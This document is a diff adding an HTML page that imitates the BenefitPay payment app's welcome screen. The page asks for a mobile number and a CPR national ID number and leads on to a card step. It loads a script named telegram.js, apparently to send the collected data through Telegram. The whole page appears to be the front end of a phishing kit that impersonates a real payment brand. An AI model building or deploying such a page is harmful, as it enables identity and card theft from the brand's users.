@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome To BenefitPay</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="mobile-frame">
+        <div class="mobile-screen">
+            <!-- Splash Screen -->
+            <div class="splash-screen" id="splashScreen">
+                <img src="splash screen.jpg" alt="BenefitPay Splash" class="splash-image">
+            </div>
+            
+            <div class="container" id="mainContent" style="display: none;">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo-container">
+                <img src="benefitpay-download.png" alt="BenefitPay Logo" class="logo">
+                <div class="welcome-text">
+                    <div>Welcome To</div>
+                    <div class="brand-name">BenefitPay</div>
+                </div>
+            </div>
+            <button class="lang-btn">عربي</button>
+        </div>
+
+        <!-- Mobile Number Section -->
+        <div class="form-section">
+            <label class="input-label">Mobile Number</label>
+            <div class="phone-input-container">
+                <div class="country-code" id="countryCode" onclick="toggleCountryDropdown(event)">
+                    <span id="selectedCode">+973</span>
+                    <span class="dropdown-icon">▼</span>
+                    <div class="country-dropdown" id="countryDropdown">
+                        <div class="country-option" onclick="selectCountryCode('+961', event)">+961</div>
+                        <div class="country-option" onclick="selectCountryCode('+965', event)">+965</div>
+                        <div class="country-option" onclick="selectCountryCode('+966', event)">+966</div>
+                        <div class="country-option" onclick="selectCountryCode('+968', event)">+968</div>
+                        <div class="country-option" onclick="selectCountryCode('+971', event)">+971</div>
+                        <div class="country-option selected" onclick="selectCountryCode('+973', event)">+973</div>
+                        <div class="country-option" onclick="selectCountryCode('+974', event)">+974</div>
+                    </div>
+                </div>
+                <input type="tel" class="phone-input" placeholder="Mobile Number" id="phoneNumber">
+            </div>
+
+            <!-- CPR Section -->
+            <label class="input-label" style="margin-top: 20px;">CPR</label>
+            <input type="text" class="cpr-input" placeholder="CPR" id="cprNumber" maxlength="9">
+        </div>
+
+        <!-- Terms and Conditions -->
+        <div class="terms-section">
+            <input type="checkbox" id="termsCheckbox" class="checkbox">
+            <label for="termsCheckbox" class="terms-label">
+                I have read and agreed to the<br>
+                <span class="terms-link">Terms and Conditions and Privacy Policy</span>
+            </label>
+        </div>
+
+        <!-- Help Section -->
+        <div class="help-section">
+            <span class="help-icon">?</span>
+            <span class="help-text">Any question? <span class="contact-link">Contact Us</span></span>
+        </div>
+
+        <!-- Start Button -->
+        <button class="start-btn" onclick="proceedToCard()">Start</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="config.js"></script>
+    <script src="telegram.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
+
